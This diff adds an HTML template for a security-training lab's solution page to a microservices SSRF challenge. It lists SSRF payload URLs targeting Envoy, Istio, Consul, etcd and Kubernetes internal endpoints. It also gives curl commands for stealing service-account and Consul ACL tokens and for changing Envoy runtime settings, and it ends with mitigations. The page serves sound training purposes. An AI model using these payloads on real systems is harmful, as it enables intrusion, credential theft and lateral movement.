@@ -1,0 +1,190 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 21 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 21 Solution: SSRF in Microservices</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates SSRF vulnerabilities in microservices architectures, targeting service mesh components, service discovery, and inter-service communication channels.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand microservices architecture:</strong> Service mesh, discovery, communication patterns</li>
+                    <li><strong>Identify service mesh components:</strong> Istio, Envoy, Consul, etcd</li>
+                    <li><strong>Target service discovery:</strong> Access service registry and configuration</li>
+                    <li><strong>Exploit inter-service communication:</strong> Lateral movement through service mesh</li>
+                </ol>
+
+                <h4>Microservices SSRF Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Istio service mesh targeting
+Service Name: user-service
+Mesh Endpoint: http://localhost:15000/config_dump
+
+# Envoy proxy admin interface
+Service Name: payment-service
+Mesh Endpoint: http://127.0.0.1:9901/stats
+
+# Consul service discovery
+Service Name: billing-service
+Mesh Endpoint: http://consul.service.consul:8500/v1/catalog/services
+
+# etcd configuration access
+Service Name: config-service
+Mesh Endpoint: http://etcd.internal:2379/v2/keys/
+
+# Kubernetes service discovery
+Service Name: auth-service
+Mesh Endpoint: http://kubernetes.default.svc.cluster.local:443/api/v1/services</code></pre>
+                    </div>
+                </div>
+
+                <h4>Service Mesh Exploitation:</h4>
+                <ul>
+                    <li><strong>Istio Pilot:</strong> Service discovery and configuration</li>
+                    <li><strong>Envoy Admin API:</strong> Proxy configuration and statistics</li>
+                    <li><strong>Consul API:</strong> Service registry and health checks</li>
+                    <li><strong>etcd API:</strong> Configuration storage and secrets</li>
+                </ul>
+
+                <h4>Istio Service Mesh Targets:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Istio Pilot discovery service
+http://istio-pilot:15010/debug/endpointz
+http://istio-pilot:15010/debug/configz
+http://istio-pilot:15010/debug/registryz
+
+# Istio Citadel (security)
+http://istio-citadel:15014/debug/endpointz
+http://istio-citadel:8080/version
+
+# Istio Galley (configuration)
+http://istio-galley:15014/debug/endpointz
+http://istio-galley:9901/stats
+
+# Istio Mixer (telemetry)
+http://istio-mixer:15014/debug/endpointz
+http://istio-mixer:9901/config_dump</code></pre>
+                    </div>
+                </div>
+
+                <h4>Envoy Proxy Exploitation:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Envoy admin interface endpoints
+http://127.0.0.1:15000/config_dump    # Complete configuration
+http://127.0.0.1:15000/clusters       # Upstream clusters
+http://127.0.0.1:15000/listeners      # Listener configuration
+http://127.0.0.1:15000/stats          # Runtime statistics
+http://127.0.0.1:15000/runtime        # Runtime parameters
+http://127.0.0.1:15000/certs          # Certificate information
+
+# Service-specific Envoy sidecars
+http://user-service-envoy:15000/config_dump
+http://payment-service-envoy:15000/clusters
+http://auth-service-envoy:15000/listeners</code></pre>
+                    </div>
+                </div>
+
+                <h4>Service Discovery Exploitation:</h4>
+                <ul>
+                    <li><strong>Consul:</strong> /v1/catalog/services, /v1/kv/, /v1/health/</li>
+                    <li><strong>etcd:</strong> /v2/keys/, /v3/kv/range</li>
+                    <li><strong>Kubernetes:</strong> /api/v1/services, /api/v1/endpoints</li>
+                    <li><strong>Eureka:</strong> /eureka/apps, /eureka/instances</li>
+                </ul>
+
+                <h4>Inter-Service Communication:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Direct service-to-service calls
+http://user-service.default.svc.cluster.local:8080/internal/users
+http://payment-service.internal:3000/admin/transactions
+http://billing-service.prod:8080/internal/invoices
+
+# Service mesh internal APIs
+http://auth-service:8080/internal/validate-token
+http://notification-service:8080/internal/send-alert
+http://audit-service:8080/internal/log-event
+
+# Database and cache services
+http://user-db.internal:5432/postgres
+http://session-cache.internal:6379/info
+http://config-store.internal:2379/v2/keys/</code></pre>
+                    </div>
+                </div>
+
+                <h4>Kubernetes Service Mesh:</h4>
+                <ul>
+                    <li><strong>Service accounts:</strong> JWT token extraction and reuse</li>
+                    <li><strong>Pod-to-pod communication:</strong> Direct container access</li>
+                    <li><strong>Namespace traversal:</strong> Cross-namespace service access</li>
+                    <li><strong>RBAC bypass:</strong> Service account privilege escalation</li>
+                </ul>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>Service mesh tools:</strong> istioctl, consul CLI, etcdctl</li>
+                    <li><strong>Kubernetes tools:</strong> kubectl, kubectx, kubens</li>
+                    <li><strong>API testing:</strong> curl, httpie, Postman</li>
+                    <li><strong>Service discovery:</strong> Custom enumeration scripts</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Complete service mesh configuration exposure</li>
+                    <li>Service discovery and architecture mapping</li>
+                    <li>Inter-service authentication bypass</li>
+                    <li>Lateral movement through microservices</li>
+                    <li>Configuration and secret extraction</li>
+                </ul>
+
+                <h4>Advanced Exploitation Techniques:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># JWT token extraction from service mesh
+curl http://istio-proxy:15000/stats | grep jwt
+
+# Service account token theft
+curl http://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/default/serviceaccounts/default/token
+
+# Envoy configuration manipulation
+curl -X POST http://envoy-admin:15000/runtime_modify?key=value
+
+# Consul ACL token extraction
+curl http://consul.service.consul:8500/v1/acl/tokens</code></pre>
+                    </div>
+                </div>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Implement proper service mesh security policies</li>
+                    <li>Use mutual TLS (mTLS) for inter-service communication</li>
+                    <li>Secure service discovery with authentication</li>
+                    <li>Implement network policies and segmentation</li>
+                    <li>Regular security audits of service mesh configuration</li>
+                    <li>Monitor inter-service communication patterns</li>
+                </ul>
+
+                <div class="alert alert-danger">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>Critical Architecture Risk</h5>
+                    <p class="mb-0">Microservices SSRF can compromise entire distributed systems, providing attackers with deep access to internal service communications and sensitive configuration data.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level21" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level22" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
